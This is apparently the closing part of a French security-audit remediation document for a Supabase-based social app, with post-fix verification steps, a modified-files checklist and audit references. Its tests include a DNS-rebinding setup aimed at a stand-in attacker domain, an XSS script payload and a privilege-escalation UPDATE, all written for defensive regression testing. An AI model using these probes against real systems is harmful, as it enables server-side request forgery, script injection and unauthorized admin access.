# La row social_reports doit avoir workflow_status='submitted' (fallback), pas 'dismissed'
```

**Post-fix S-02 (DNS rebind)** :
```bash
# Configurer un domaine attacker.example.com → A 127.0.0.1
# WEBHOOK_ALLOWED_HOSTS=attacker.example.com
# Appeler une Edge Function qui utilise validateWebhookUrl(attacker.example.com)
# Doit lever 'webhook_host_resolves_private'
```

**Post-fix S-15 (reaction bounds)** :
```sql
-- En psql connecté en service_role :
SELECT public.set_social_post_admin_reaction_adjustments(
  '00000000-0000-0000-0000-000000000000'::uuid,
  10001, 0
);
-- Doit lever : new row violates check constraint "social_posts_admin_like_adjustment_range"
```

**Smoke test global (intégration)** :
1. Créer un post avec `<script>alert(1)</script>` → doit être rejeté par `normalizeSocialText` avec `invalid_text`.
2. Tenter `account_tier='admin'` UPDATE depuis client authentifié → `42501` (trigger `guard_user_profile_tier_self_change`).
3. 4 comptes coordonnés reportent un post → vérifier auto-hide à 3 (avant fix S-12) ou pas d'auto-hide si comptes < 7j (après fix S-12).
4. Webhook n8n down → vérifier que `social-report-content` ne crash pas et que `workflow_status` reste `submitted`.
5. Eradicate user content + retry réseau → vérifier qu'un seul `admin_audit_events` est créé après fix S-09.

### C. Fichiers modifiés (placeholder)

À remplir au fur et à mesure des PRs :

- [x] `supabase/functions/_shared/phase2Webhook.ts` (S-01) — 2026-05-19
- [x] `supabase/functions/_shared/webhookHostAllowlist.ts` (S-02) — 2026-05-19
- [x] `supabase/functions/_shared/webhookHostAllowlist.test.ts` (S-02 tests) — 2026-05-19
- [x] `supabase/functions/_shared/phase2Webhook.test.ts` (S-01 + S-02 tests) — 2026-05-19
- [x] `supabase/functions/_shared/phase2Moderation.ts` (S-08 hardcode threshold) — 2026-05-19
- [x] `supabase/functions/_shared/phase2Moderation.test.ts` (S-08 tests) — 2026-05-19
- [x] `supabase/functions/_shared/phase2Contracts.ts` (S-15 contract bounds) — 2026-05-19
- [x] `supabase/functions/_shared/phase2Auth.ts` (S-04, S-05, S-09 helpers) — 2026-05-19
- [x] `supabase/functions/_shared/phase2Auth.test.ts` (S-04, S-05 tests) — 2026-05-19
- [x] `supabase/functions/social-report-content/index.ts` (S-08 caller update) — 2026-05-19
- [x] `supabase/functions/social-admin-eradicate-user/index.ts` (S-09 idempotency) — 2026-05-19
- [x] `supabase/functions/admin-whoami/index.ts` (S-07 — nouvelle Edge Function) — 2026-05-19
- [x] `supabase/migrations/20260520120000_admin_idempotency_keys.sql` (S-09) — 2026-05-19
- [x] `supabase/migrations/20260521120000_clamp_social_admin_reaction_adjustments.sql` (S-15) — 2026-05-19
- [x] `hooks/queries/useAdminWhoami.ts` (S-07 — nouveau hook) — 2026-05-19
- [x] `screens/AdminSocialModerationScreen.tsx` (S-07 gating) — 2026-05-19
- [x] `services/socialAdmin.ts` (S-09 Idempotency-Key propagation) — 2026-05-19
- [x] `components/social/admin/adminModerationUtils.ts` (S-15 UI bounds) — 2026-05-19
- [x] `supabase/functions/_shared/cors.ts` (S-10 null Origin + S-11 case-insensitive) — 2026-05-19
- [x] `supabase/functions/_shared/cors.test.ts` (S-10 + S-11 tests, nouveau) — 2026-05-19
- [x] `supabase/migrations/20260522121000_weighted_report_count.sql` (S-12 shadow) — 2026-05-19
- [x] `supabase/migrations/20260523120000_release_pending_social_upload_reservations.sql` (S-14) — 2026-05-19
- [x] `supabase/migrations/20260525120000_harden_social_feed_cursor.sql` (S-16 helper) — 2026-05-19
- [x] `supabase/migrations/20260601120000_social_soft_delete_retention.sql` (S-18) — 2026-05-19
- [x] `contexts/AuthContext.tsx` (S-14 signOut purge) — 2026-05-19
- [x] `supabase/functions/social-admin-moderate-user/index.ts` (S-09 étendu) — 2026-05-19
- [x] `supabase/functions/social-admin-adjust-post-reactions/index.ts` (S-09 étendu) — 2026-05-19
- [x] `supabase/functions/_shared/phase2Auth.ts` (S-09 distinction 23505 → 409) — 2026-05-19
- [x] `services/socialAdmin.ts` (S-09 helper generateAdminIdempotencyKey + propagation moderate/adjust) — 2026-05-19
- [x] `supabase/functions/purge-soft-deleted-social-assets/index.ts` (S-18 Edge Function, nouvelle) — 2026-05-19
- [ ] `supabase/functions/_shared/phase2Auth.ts` (S-04, S-05)
- [ ] `supabase/functions/_shared/phase2Moderation.ts` (S-08)
- [ ] `supabase/functions/_shared/phase2Contracts.ts` (S-15)
- [ ] `supabase/functions/_shared/cors.ts` (S-10, S-11)
- [ ] `supabase/functions/admin-whoami/index.ts` (S-07 — nouvelle Edge Function)
- [ ] `supabase/migrations/20260520_admin_idempotency_keys.sql` (S-09 — nouvelle migration)
- [ ] `supabase/migrations/20260521_clamp_social_admin_reaction_adjustments.sql` (S-15 — nouvelle migration)
- [ ] `supabase/migrations/20260522_weighted_report_count.sql` (S-12 — nouvelle migration)
- [ ] `supabase/migrations/20260601_social_soft_delete_retention.sql` (S-18 — nouvelle migration)
- [ ] `screens/AdminSocialModerationScreen.tsx` (S-07)
- [ ] `contexts/AuthContext.tsx` (S-14)

### D. Références

- [SECURITY_FIX_PLAN_2026_05.md](SECURITY_FIX_PLAN_2026_05.md) — Plan de remédiation général.
- [TRUST_BOUNDARIES.md](TRUST_BOUNDARIES.md) — Risques acceptés (notamment AAL2 désactivé, S-06).
- [SECURITY_AUDIT_SUPABASE.md](SECURITY_AUDIT_SUPABASE.md) — Config Supabase.
- [BACKEND_SECURITY_AUDIT.md](BACKEND_SECURITY_AUDIT.md) — Audit backend complémentaire (B-01 à B-07).
- [XSS_HTML_SECURITY_AUDIT.md](XSS_HTML_SECURITY_AUDIT.md) — Audit XSS/HTML (F-01, F-06, F-10 social).
- [SETTINGS_ADMIN_SECURITY_AUDIT.md](SETTINGS_ADMIN_SECURITY_AUDIT.md) — Audit admin (account_tier, MFA).
- [SOCIAL_FIX_PLAN.md](SOCIAL_FIX_PLAN.md) — Plan de remédiation détaillé pour cet audit.
